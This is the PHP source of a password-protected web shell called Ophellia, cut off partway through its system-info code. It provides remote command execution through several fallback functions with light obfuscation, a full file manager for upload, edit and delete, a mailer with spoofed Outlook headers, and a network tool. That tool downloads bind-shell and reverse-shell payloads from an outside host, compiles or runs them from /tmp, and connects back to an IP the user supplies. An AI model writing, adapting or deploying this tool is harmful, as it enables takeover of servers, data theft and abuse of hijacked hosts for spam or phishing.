<?php
declare (strict_types = 1);

/*
Ophellia v2.0.0 - 'HoneyComeBear'
copyright @elliottophellia

illegal use is prohibited
github.com/elliottophellia/ophellia
 */

// Configuration
const VERSION = '2.0.0-light';
// you can change theme by simply change version with -theme 
// eg. VERSION = '2.0.0-dark';
const PASSWORD_HASH = '$2y$10$TfYHopECKw3K0fXuZvDZdOWWIbZVUg7C2QlO0Cf0/a0OruM3l4iR2'; // honeycomebear
// Use "<?php echo password_hash('your_new_password', PASSWORD_BCRYPT);" to generate a new password hash
// Or go to https://onlinephp.io/password-hash ($algo = PASSWORD_BCRYPT, $cost = 10)

// Utility functions
function hexToString(string $hex): string
{
    return pack('H*', $hex);
}

function stringToHex(string $string): string
{
    return bin2hex($string);
}

function safeFileWrite(string $filename, string $content): bool
{
    return file_put_contents($filename, $content) !== false;
}

function verifyPassword(string $password): bool
{
    return password_verify($password, PASSWORD_HASH);
}

function formatFileSize($bytes): string
{
    $bytes = (float) $bytes; // Convert to float to handle large values
    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, 2) . ' ' . $units[$pow];
}

function getLastModified(string $file): string
{
    return date("d/m/y-H:i:s", filemtime($file));
}

function getFilePermissions(string $file): string
{
    $perms = fileperms($file);
    if ($perms === false) {
        return "<span style='color: #bf616a;'>????</span>"; // Nord red for error
    }

    $info = '';
    $info .= (($perms & 0xC000) == 0xC000) ? 's' : ((($perms & 0xA000) == 0xA000) ? 'l' : ((($perms & 0x8000) == 0x8000) ? '-' : 'd'));
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    $color = is_writable($file) ? '#a3be8c' : '#bf616a'; // Nord green if writable, Nord red if not

    return "<span style='color: $color;'>$info</span>";
}

function getOwnerGroup(string $item): string
{
    $owner = function_exists("posix_getpwuid") ? posix_getpwuid(fileowner($item))['name'] : fileowner($item);
    $group = function_exists("posix_getgrgid") ? posix_getgrgid(filegroup($item))['name'] : filegroup($item);
    return "$owner/$group";
}

function getFileType(string $file): string
{
    return mime_content_type($file) ?: filetype($file) ?: 'Unknown';
}

function getFunctionalCmd(string $cmd): string
{
    $funcs = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen'];
    $obfuscated = base64_encode(serialize($funcs));
    $deobfuscate = function ($x) {return unserialize(base64_decode($x));};

    foreach ($deobfuscate($obfuscated) as $func) {
        if (function_exists($func)) {
            return obfuscatedExecution($func, $cmd);
        }
    }

    return "No available function to execute command.";
}

function obfuscatedExecution(string $func, string $cmd): string
{
    $encoded = base64_encode($cmd);
    $decoded = base64_decode($encoded);

    switch ($func) {
        case 'shell_exec':
        case 'exec':
            return call_user_func($func, $decoded);
        case 'system':
        case 'passthru':
            ob_start();
            call_user_func($func, $decoded);
            return ob_get_clean();
        case 'proc_open':
            return executeWithProc_open($decoded);
        case 'popen':
            return executeWithPopen($decoded);
        default:
            return "Unknown function: $func";
    }
}

function executeWithProc_open(string $cmd): string
{
    $spec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
    $proc = call_user_func('proc_open', $cmd, $spec, $pipes);
    if (is_resource($proc)) {
        fclose($pipes[0]);
        $out = stream_get_contents($pipes[1]);
        $err = stream_get_contents($pipes[2]);
        array_map('fclose', array_slice($pipes, 1));
        proc_close($proc);
        return $err ? "Error: $err" : $out;
    }
    return "Failed to execute command using proc_open.";
}

function executeWithPopen(string $cmd): string
{
    $handle = call_user_func('popen', $cmd, 'r');
    if ($handle) {
        $output = stream_get_contents($handle);
        pclose($handle);
        return $output;
    }
    return "Failed to execute command using popen.";
}

class Elliottophellia
{
    private string $currentPath;
    private array $get;
    private array $post;
    private array $files;
    private string $selfFile;

    public function __construct(array $get, array $post, array $files)
    {
        $this->get = $get;
        $this->post = $post;
        $this->files = $files;
        $this->currentPath = hexToString($this->get['d'] ?? stringToHex(getcwd()));
        $this->selfFile = $_SERVER['PHP_SELF'];
        chdir($this->currentPath);
    }

    public function run(): void
    {
        if (!$this->isAuthenticated()) {
            $this->showLoginForm();
            return;
        }

        $this->showHeader();

        if (isset($this->get['t'])) {
            $tool = hexToString($this->get['t']);
            switch ($tool) {
                case 'network':
                    $this->showNetworkTools();
                    break;
                case 'mailer':
                    $this->showMailerTools();
                    break;
                case 'upload':
                    $this->showUploadTools();
                    break;
                case 'info':
                    $this->showSystemInfo();
                    break;
                case 'mkfile':
                    $this->showFileCreationTools();
                    break;
                case 'mkdir':
                    $this->showDirectoryCreationTools();
                    break;
                case 'command':
                    $this->showCommandExecutionTools();
                    break;
                case 'cname':
                    $this->showRenameFileTools();
                    break;
                case 'fedit':
                    $this->showFileEditTools();
                    break;
                case 'fview':
                    $this->showFileViewTools();
                    break;
                case 'download':
                    $this->downloadFile(hexToString($this->get['f']));
                    break;
                default:
                    $this->showFileManager();
                    break;
            }
        } else {
            $this->showFileManager();
        }

        $this->handleFileOperations();
        $this->showFooter();
    }

    private function isAuthenticated(): bool
    {
        if (isset($this->post['pass'])) {
            if (verifyPassword($this->post['pass'])) {
                $_SESSION['authenticated'] = true;
            }
        }

        return $_SESSION['authenticated'] ?? false;
    }

    private function showLoginForm(): void
    {
        echo '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta name="robots" content="noindex, nofollow" />
            <title>WELCOME!</title>
            <link rel="stylesheet" href="https://rei.my.id/assets/css/ophellia/v'.VERSION.'.css">
            <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
        </head>
        <body>
            <div class="login-container">
                <h1>WELCOME BACK!</h1>
                <form action="" method="post">
                    <input type="password" name="pass" placeholder="Password" required>
                    <button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>';
    }

    private function showHeader(): void
    {
        echo '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>OPHELLIA v' . VERSION . '</title>
            <link rel="stylesheet" href="https://rei.my.id/assets/css/ophellia/v'.VERSION.'.css">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
            <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
        </head>
        <body>
            <header>
                <h1 class="title">ELLIOTTOPHELLIA</h1>
                <p class="uname">' . php_uname('a') . '</p>
            </header>

        <nav class="mobile-nav">
            <button class="hamburger" aria-label="Menu">☰ MENU</button>
            <ul class="nav-menu">
              <li><a href="' . $this->selfFile . '"><i class="fas fa-home"></i> Home</a></li>
              <li><a href="' . $this->selfFile . '?t=' . stringToHex('upload') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-upload"></i> Upload</a></li>
              <li><a href="' . $this->selfFile . '?t=' . stringToHex('network') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-network-wired"></i> Network</a></li>
              <li><a href="' . $this->selfFile . '?t=' . stringToHex('mailer') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-envelope"></i> Mailer</a></li>
              <li><a href="' . $this->selfFile . '?t=' . stringToHex('info') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-info-circle"></i> Info</a></li>
              <li><a href="' . $this->selfFile . '?exit"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
          </ul>
        </nav>

            <main>';
    }

    private function handleFileOperations(): void
    {
        if (isset($this->get['rfile']) && is_writable(hexToString($this->get['rfile']))) {
            $this->removeFile(hexToString($this->get['rfile']));
        }

        if (isset($this->get['rmdir']) && is_writable(hexToString($this->get['rmdir']))) {
            $this->removeDirectory(hexToString($this->get['rmdir']));
        }

        if (isset($this->get['exit'])) {
            $this->exit();
        }
    }

    private function removeFile(string $file): void
    {
        if (unlink($file)) {
            echo "<dialog id='successModal' class='modal success'>
            <p>File $file Deleted Successfully!</p>
            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
          </dialog>";
            echo "<script>document.getElementById('successModal').showModal();</script>";
        } else {
            echo "<dialog id='errorModal' class='modal error'>
            <p>Failed to delete file $file.</p>
            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
          </dialog>";
            echo "<script>document.getElementById('errorModal').showModal();</script>";
        }
    }

    private function removeDirectory(string $dir): void
    {
        if (rmdir($dir)) {
            echo "<dialog id='successModal' class='modal success'>
            <p>Directory $dir Deleted Successfully!</p>
            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
          </dialog>";
            echo "<script>document.getElementById('successModal').showModal();</script>";
        } else {
            echo "<dialog id='errorModal' class='modal error'>
            <p>Failed to delete directory.</p>
            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
          </dialog>";
            echo "<script>document.getElementById('errorModal').showModal();</script>";
        }
    }

    private function createFile(string $fileName, string $fileContent = ''): void
    {
        $fullPath = $this->currentPath . '/' . $fileName;

        if (file_put_contents($fullPath, $fileContent) !== false) {
            echo "<dialog id='successModal' class='modal success'>
                <p>File '$fileName' Created Successfully!</p>
                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
              </dialog>";
            echo "<script>document.getElementById('successModal').showModal();</script>";
        } else {
            echo "<dialog id='errorModal' class='modal error'>
                <p>Failed to create file '$fileName'.</p>
                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?t=" . stringToHex('mkfile') . "&d=" . stringToHex($this->currentPath) . "';'>Close</button>
              </dialog>";
            echo "<script>document.getElementById('errorModal').showModal();</script>";
        }
    }

    private function createDirectory(string $dir): void
    {
        if (mkdir($this->currentPath . "/" . $dir, 0777, true)) {
            echo "<dialog id='successModal' class='modal success'>
                <p>Directory $dir Created Successfully!</p>
                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
              </dialog>";
            echo "<script>document.getElementById('successModal').showModal();</script>";
        } else {
            echo "<dialog id='errorModal' class='modal error'>
                <p>Failed to create directory $dir.</p>
                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
              </dialog>";
            echo "<script>document.getElementById('errorModal').showModal();</script>";
        }
    }

    private function exit(): void
    {
        session_destroy();
        echo '<script>window.location.href = "' . $this->selfFile . '";</script>';
    }

    private function downloadFile(string $file): void
    {
        if (file_exists($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        }
    }

    private function executeNetworkTool(string $type, string $ip, string $port, string $pty, string $rby, string $bcc, string $bcp, string $bpc, string $bpp): void
    {
        switch ($type) {
            case 'cb':
                safeFileWrite('/tmp/cb.c', $bpc);
                getFunctionalCmd('gcc -o /tmp/cb /tmp/cb.c');
                getFunctionalCmd('/tmp/cb ' . $port . ' &');
                echo "<pre>" . getFunctionalCmd('ps aux | grep cb') . "</pre>";
                break;
            case 'pb':
                safeFileWrite('/tmp/pb.pl', $bpp);
                getFunctionalCmd('perl /tmp/pb.pl ' . $port . ' &');
                echo "<pre>" . getFunctionalCmd('ps aux | grep pb') . "</pre>";
                break;
            case 'cbc':
                safeFileWrite('/tmp/cbc.c', $bcc);
                getFunctionalCmd('gcc -o /tmp/cbc /tmp/cbc.c');
                getFunctionalCmd('/tmp/cbc ' . $ip . ' ' . $port . ' &');
                echo "<pre>" . getFunctionalCmd('ps aux | grep cbc') . "</pre>";
                break;
            case 'pbc':
                safeFileWrite('/tmp/pbc.pl', $bcp);
                getFunctionalCmd('perl /tmp/pbc.pl ' . $ip . ' ' . $port . ' &');
                echo "<pre>" . getFunctionalCmd('ps aux | grep pbc') . "</pre>";
                break;
            case 'rbb':
                safeFileWrite('/tmp/rbb.rb', $rby);
                getFunctionalCmd('ruby /tmp/rbb.rb ' . $port . ' &');
                echo "<pre>" . getFunctionalCmd('ps aux | grep rbb') . "</pre>";
                break;
            case 'rbbc':
                safeFileWrite('/tmp/rbbc.rb', $rby);
                getFunctionalCmd('ruby /tmp/rbbc.rb ' . $port . ' ' . $ip . ' &');
                echo "<pre>" . getFunctionalCmd('ps aux | grep rbbc') . "</pre>";
                break;
            case 'pyb':
                safeFileWrite('/tmp/pyb.py', $pty);
                getFunctionalCmd('python /tmp/pyb.py ' . $port . ' &');
                echo "<pre>" . getFunctionalCmd('ps aux | grep pyb') . "</pre>";
                break;
            case 'pybc':
                safeFileWrite('/tmp/pybc.py', $pty);
                getFunctionalCmd('python /tmp/pybc.py ' . $port . ' ' . $ip . ' &');
                echo "<pre>" . getFunctionalCmd('ps aux | grep pybc') . "</pre>";
                break;
        }
    }

    private function checkMailServerAccess(): bool
    {
        $testTo = 'test@example.com';
        $testSubject = 'Test Mail Server Access';
        $testMessage = 'This is a test message to check mail server access.';
        $testHeaders = 'From: test@' . $_SERVER['SERVER_NAME'] . "\r\n" . 'X-Mailer: PHP/' . phpversion();

        // Suppress warnings and notices during the mail() function call
        $errorReporting = error_reporting();
        error_reporting(E_ERROR);

        $result = @mail($testTo, $testSubject, $testMessage, $testHeaders);

        // Restore original error reporting level
        error_reporting($errorReporting);

        return $result;
    }

    private function sendSimpleMail(): void
    {
        $to = $this->extractEmail($this->post['to']);
        $subject = $this->post['subject'];
        $message = $this->post['message'];
        $from = $this->extractEmail($this->post['from']);
        $fromName = $this->extractName($this->post['from']);

        $headers = "From: $fromName <$from>\r\n";
        $headers .= "Reply-To: $from\r\n";
        $headers .= "X-Priority: 1\r\n";
        $headers .= "X-MSmail-Priority: High\r\n";
        $headers .= "X-Mailer: Microsoft Office Outlook, Build 11.0.5510\r\n";
        $headers .= "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\r\n";

        if (mail($to, $subject, $message, $headers)) {
            echo "<dialog id='successModal' class='modal success'>
                    <p>Mail Sent Successfully!</p>
                    <button onclick='this.closest('dialog').close()'>Close</button>
                  </dialog>";
            echo "<script>document.getElementById('successModal').showModal();</script>";
        } else {
            echo "<dialog id='errorModal' class='modal error'>
                    <p>Failed to send mail.</p>
                    <button onclick='this.closest('dialog').close()'>Close</button>
                  </dialog>";
            echo "<script>document.getElementById('errorModal').showModal();</script>";
        }
    }

    private function extractEmail(string $input): string
    {
        if (strpos($input, '<') !== false && strpos($input, '>') !== false) {
            preg_match('/<(.+?)>/', $input, $matches);
            return $matches[1] ?? $input;
        }
        return trim($input);
    }

    private function extractName(string $input): string
    {
        preg_match('/(.+?)\s*</', $input, $matches);
        return trim($matches[1] ?? '');
    }

    private function handleFileUpload(): void
    {
        $uploadPath = $this->post['uploadtype'] == 1 ? $this->currentPath : $_SERVER['DOCUMENT_ROOT'];
        $tmp = $this->files['upload']['tmp_name'];
        $up = basename($this->files['upload']['name']);
        if (move_uploaded_file($tmp, $uploadPath . "/" . $up)) {
            echo "<dialog id='successModal' class='modal success'>
            <p>File Uploaded successfully!</p>
            <button onclick='this.closest('dialog').close()'>Close</button>
          </dialog>";
            echo "<script>document.getElementById('successModal').showModal();</script>";
        } else {
            echo "<dialog id='errorModal' class='modal error'>
            <p>Failed to upload file.</p>
            <button onclick='this.closest('dialog').close()'>Close</button>
          </dialog>";
            echo "<script>document.getElementById('errorModal').showModal();</script>";
        }
    }

    private function showPathNavigation(): void
    {
        echo '<p class="file-manager-utils">';
        $ps = preg_split("/(\\\|\/)/", $this->currentPath);
        foreach ($ps as $k => $v) {
            if ($k == 0 && $v == "") {
                echo "<a href='?d=2f'>~</a>/";
                continue;
            }
            if ($v == "") {
                continue;
            }

            echo "<a href='?d=";
            for ($i = 0; $i <= $k; $i++) {
                echo stringToHex($ps[$i]);
                if ($i != $k) {
                    echo "2f";
                }

            }
            echo "'>{$v}</a>/";
        }
        echo '</p>';
    }

    private function showFileCreator(): void
    {
        echo '<p class="file-manager-utils">
        [ <a href="' . $this->selfFile . '?t=' . stringToHex('mkfile') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-file-alt"></i> New File</a> ]
        [ <a href="' . $this->selfFile . '?t=' . stringToHex('mkdir') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-folder-plus"></i> New Folder</a> ]
        [ <a href="' . $this->selfFile . '?t=' . stringToHex('command') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-terminal"></i> Command</a> ]
        </p>';
    }

    private function showFileManager(): void
    {
        echo '<section class="tool-section">
        <h2>File Manager</h2>';

        $this->showPathNavigation();
        $this->showFileCreator();

        echo '<table class="table-container">
        <thead>
            <tr>
                <th>File Name</th>
                <th>Actions</th>
                <th>Size</th>
                <th>Type</th>
                <th>Permissions</th>
                <th>Owner/Group</th>
                <th>Last Modified</th>
            </tr>
        </thead>
        <tbody>';

        $files = scandir($this->currentPath);
        $folders = [];
        $regularFiles = [];

        foreach ($files as $file) {
            if (is_dir($this->currentPath . '/' . $file)) {
                $folders[] = $file;
            } else {
                $regularFiles[] = $file;
            }
        }

        // Display folders first
        foreach ($folders as $folder) {
            $fullPath = $this->currentPath . '/' . $folder;

            if ($folder == "." || $folder == "..") {
                $link = $folder == ".." ? stringToHex(dirname($this->currentPath)) : stringToHex($this->currentPath);
                echo "<tr>
                <td><img src='//rei.my.id/fldr.png' /> <b><a href='?d={$link}'>$folder</a></b></td>
                <td colspan='6'></td>
            </tr>";
            } else {
                $actions = "<i class='fa fa-fw fa-download nothing'></i> <i class='fa fa-fw fa-edit nothing'></i> <a href='" . $this->selfFile . "?t=" . stringToHex("cname") . "&oldname=" . stringToHex($folder) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-pencil'></i></a> <a href='{$this->selfFile}?rmdir=" . stringToHex($folder) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-trash'></i></a>";
                echo "<tr>
                <td><img src='//rei.my.id/fldr.png' /> <b><a href='{$this->selfFile}?d=" . stringToHex($fullPath) . "'>$folder</a></b></td>
                <td>$actions</td>
                <td>-</td>
                <td>" . getFileType($fullPath) . "</td>
                <td>" . getFilePermissions($fullPath) . "</td>
                <td>" . getOwnerGroup($fullPath) . "</td>
                <td>" . getLastModified($fullPath) . "</td>
            </tr>";
            }
        }

        // Then display files
        foreach ($regularFiles as $file) {
            $fullPath = $this->currentPath . '/' . $file;
            $actions = "<a href='" . $this->selfFile . '?t=' . stringToHex('download') . '&f=' . stringToHex($file) . '&d=' . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-download'></i></a> <a href='{$this->selfFile}?t=" . stringToHex('fedit') . "&fedit=" . stringToHex($file) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-edit'></i></a> <a href='" . $this->selfFile . "?t=" . stringToHex("cname") . "&oldname=" . stringToHex($file) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-pencil'></i></a> <a href='{$this->selfFile}?rfile=" . stringToHex($file) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-trash'></i></a>";

            echo "<tr>
            <td><img src='//rei.my.id/file.png' /> <a href='{$this->selfFile}?t=" . stringToHex('fview') . "&f=" . stringToHex($file) . "&d=" . stringToHex($this->currentPath) . "'>$file</a></td>
            <td>$actions</td>
            <td>" . formatFileSize(filesize($fullPath)) . "</td>
            <td>" . getFileType($fullPath) . "</td>
            <td>" . getFilePermissions($fullPath) . "</td>
            <td>" . getOwnerGroup($fullPath) . "</td>
            <td>" . getLastModified($fullPath) . "</td>
        </tr>";
        }

        echo '</tbody></table></section>';
    }

    private function showFileViewTools(): void
    {
        $file = hexToString($this->get['f']);
        $content = htmlspecialchars(file_get_contents($file));

        echo '<section class="tool-section">
            <h2>View File: ' . htmlspecialchars($file) . '</h2>
            <form method="post" action="">
                <div class="form-group">
                    <textarea rows="25" readonly>' . $content . '</textarea>
                </div>
                <button type="button" onclick="editFile()">Edit</button>
                <button type="button" onclick="downloadFile()">Download</button>
                <button type="button" onclick="goBack()">Back</button>
            </form>
            <script>
            function goBack() {
                window.location.href = "' . $this->selfFile . '?d=' . stringToHex($this->currentPath) . '";
            }
            function editFile() {
                window.location.href = "' . $this->selfFile . '?t=' . stringToHex('fedit') . '&fedit=' . stringToHex($file) . '&d=' . stringToHex($this->currentPath) . '";
            }
            function downloadFile() {
                window.location.href = "' . $this->selfFile . '?t=' . stringToHex('download') . '&f=' . stringToHex($file) . '&d=' . stringToHex($this->currentPath) . '";
            }
            </script>
        </section>';
    }

    private function showFileEditTools(): void
    {
        $file = hexToString($this->get['fedit']);
        $content = htmlspecialchars(file_get_contents($file));

        echo '<section class="tool-section">
            <h2>Edit File: ' . htmlspecialchars($file) . '</h2>
            <form method="post" action="">
                <div class="form-group">
                    <textarea name="content" rows="25">' . $content . '</textarea>
                </div>
                <button type="submit" name="save_edit">Save Changes</button>
                <button type="button" onclick="cancelForm()">Cancel</button>
            </form>
            <script>
            function cancelForm() {
                window.location.href = "' . $this->selfFile . '?d=' . stringToHex($this->currentPath) . '";
            }
            </script>
        </section>';

        if (isset($this->post['save_edit'])) {
            if (file_put_contents($file, $this->post['content']) !== false) {
                echo "<dialog id='successModal' class='modal success'>
                    <p>File Edited Successfully!</p>
                    <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
                  </dialog>";
                echo "<script>document.getElementById('successModal').showModal();</script>";
            } else {
                echo "<dialog id='errorModal' class='modal error'>
                    <p>Failed to edit file.</p>
                    <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
                  </dialog>";
                echo "<script>document.getElementById('errorModal').showModal();</script>";
            }
        }
    }

    private function showRenameFileTools(): void
    {
        echo '<section class="tool-section">
            <h2>Rename File: ' . hexToString($this->get['oldname']) . '</h2>
            <form method="post" action="">
            <input type="text" name="oldname" value="' . hexToString($this->get['oldname']) . '" style="display: none;" readonly>
            <input type="text" name="newname" placeholder="New File Name" required>
            <button type="submit">Rename File</button>
            <button type="button" onclick="cancelForm()">Cancel</button>
        </form>
        <script>
        function cancelForm() {
            window.location.href = "' . $this->selfFile . "?d=" . stringToHex($this->currentPath) . '";
        }
        </script></section>';
        if ($this->post['oldname'] && $this->post['newname']) {
            if (isset($this->post['oldname'])) {
                rename($this->post['oldname'], $this->post['newname']);
                echo "<dialog id='successModal' class='modal success'>
                <p>File Renamed Successfully!</p>
                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
              </dialog>";
                echo "<script>document.getElementById('successModal').showModal();</script>";

            } else {
                echo "<dialog id='errorModal' class='modal error'>
                <p>Failed to rename file.</p>
                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
              </dialog>";
                echo "<script>document.getElementById('errorModal').showModal();</script>";
            }
        }
    }

    private function showFileCreationTools(): void
    {
        echo "<section class='tool-section'>
            <h2>Create File</h2>
            <form method='post' action=''>
                <div class='form-group'>
                    <input type='text' id='fname' name='fname' placeholder='File Name' required>
                </div>
                <div class='form-group'>
                    <textarea id='ftext' name='ftext' rows='15' placeholder='File Content'></textarea>
                </div>
                <button type='submit' name='createfile'>Create File</button>
            <button type='button' onclick='cancelForm()'>Cancel</button>
        </form>
        <script>
        function cancelForm() {
            window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';
        }
        </script>
        </section>";

        if (isset($this->post['createfile'])) {
            $this->createFile($this->post['fname'], $this->post['ftext'] ?? '');
        }
    }

    private function showDirectoryCreationTools(): void
    {
        echo "<section class='tool-section'>
        <h2>Create Directory</h2>
        <form method='post' action='' id='dirForm'>
            <div class='form-group'>
                <input type='text' id='dirname' name='dirname' placeholder='Directory Name' required>
            </div>
            <button type='submit' name='createdir'>Create Directory</button>
            <button type='button' onclick='cancelForm()'>Cancel</button>
        </form>
        <script>
        function cancelForm() {
            window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';
        }
        </script>
        </section>";

        if (isset($this->post['createdir'])) {
            $this->createDirectory($this->post['dirname']);
        }
    }

    private function showNetworkTools(): void
    {
        $pty = file_get_contents('https://rei.my.id/back_connect/python.txt');
        $rby = file_get_contents('https://rei.my.id/back_connect/ruby.txt');
        $bcc = file_get_contents('https://rei.my.id/back_connect/c.txt');
        $bcp = file_get_contents('https://rei.my.id/back_connect/perl.txt');
        $bpc = file_get_contents('https://rei.my.id/bind_shell/c.txt');
        $bpp = file_get_contents('https://rei.my.id/bind_shell/perl.txt');

        echo '
        <section class="tool-section">
            <h2>Network Tools</h2>
            <h3>Bind Shell</h3>
            <form method="post" action="">
                <p> IP : </p>
                <input type="text" name="ip" value="' . gethostbyname($_SERVER['HTTP_HOST']) . '" readonly>
                <p> Port : </p>
                <input type="text" name="port" value="31337">
                <p> Type : </p>
                <select name="type">
                            <option value="cb">C</option>
                            <option value="pb">Perl</option>
                            <option value="rbb">Ruby</option>
                            <option value="pyb">Python</option>
                        </select>
                <button type="submit">Execute</button>
            </form>
            <br/>
            <h3>Reverse Shell</h3>
            <form method="post" action="">
                <p> IP : </p>
                <input type="text" name="ip" value="">
                <p> Port : </p>
                <input type="text" name="port" value="31337">
                <p> Type : </p>
                <select name="type">
                    <option value="cbc">C</option>
                    <option value="pbc">Perl</option>
                    <option value="rbbc">Ruby</option>
                    <option value="pybc">Python</option>
                    </select>
                <button type="submit">Execute</button>
            </form>
        </section>';

        if (isset($this->post['type'])) {
            $this->executeNetworkTool($this->post['type'], $this->post['ip'], $this->post['port'], $pty, $rby, $bcc, $bcp, $bpc, $bpp);
        }
    }

    private function showMailerTools(): void
    {
        $mailServerAccessible = $this->checkMailServerAccess();

        echo '<section class="tool-section">
            <h2>Mailer Tools</h2>';

        if ($mailServerAccessible) {
            echo '<form method="post" action="" class="mailer-form">
                <div class="form-group">
                    <label for="from">From:</label>
                    <input type="text" id="from" name="from" value="Ophellia < ophellia@' . $_SERVER['SERVER_NAME'] . ' >">
                </div>
                <div class="form-group">
                    <label for="to">To:</label>
                    <input type="text" id="to" name="to" value="Ophellia < contact@rei.my.id >">
                </div>
                <div class="form-group">
                    <label for="subject">Subject:</label>
                    <input type="text" id="subject" name="subject" value="Fuck your mom!">
                </div>
                <div class="form-group">
                    <label for="message">Message:</label>
                    <textarea id="message" name="message" rows="15">my ip address is ' . $_SERVER['REMOTE_ADDR'] . '</textarea>
                </div>
                <div class="form-group">
                    <button type="submit" name="send_mail">Send Mail</button>
                </div>
            </form>';

            if (isset($this->post['send_mail'])) {
                $this->sendSimpleMail();
            }
        } else {
            echo '<p class="error-message">Mail server is not accessible. Mailer tools are currently disabled.</p>';
        }

        echo '</section>';
    }

    private function showUploadTools(): void
    {
        echo "<section class='tool-section'>
            <h2>Upload Tools</h2>
            <form method='post' enctype='multipart/form-data'>
                <div class='upload-options'>
                    <div class='upload-option'>
                        <input type='radio' id='current-dir' name='uploadtype' value='1' checked>
                        <p>[PATH]</p>
                        <label for='current-dir'>{$this->currentPath}</label>
                    </div>
                    <div class='upload-option'>
                        <input type='radio' id='doc-root' name='uploadtype' value='2'>
                        <p>[ROOT]</p>
                        <label for='doc-root'>{$_SERVER['DOCUMENT_ROOT']}</label>
                    </div>
                </div>
                <div class='file-input-wrapper'>
                    <input type='file' name='upload' onchange='this.form.querySelector('button[type=submit]').click()'>
                </div>
                <button type='submit' name='upload' style='display:none;'>Upload</button>
            </form>
        </section>";

        if (isset($this->post['upload'])) {
            $this->handleFileUpload();
        }
    }

    private function showCommandExecutionTools(): void
    {
        echo '<section class="tool-section">
            <h2>Execute Command</h2>
            <form method="post" action="">
                <div class="form-group">
                    <input type="text" id="command" name="execute" placeholder="uname -a" required>
                </div>
                <button type="submit">Execute</button>
                <button type="button" onclick="cancelForm()">Cancel</button>
        </form>
        <script>
        function cancelForm() {
            window.location.href = "' . $this->selfFile . "?d=" . stringToHex($this->currentPath) . '";
        }
        </script>';

        if (isset($this->post['execute']) && !empty($this->post['execute'])) {
            echo '<pre>' . getFunctionalCmd($this->post['execute']) . '</pre>';
        }

        echo '</section>';
    }

    private function showSystemInfo(): void
    {
        $disableFunctions = ini_get('disable_functions') ?: 'NONE';
        $safeMode = ini_get('safe_mode') ? 'ON' : 'OFF';
        $freeSpace = function_exists('disk_free_space') ? formatFileSize(disk_free_space(".")) : 'N/A';

        $infoItems = [
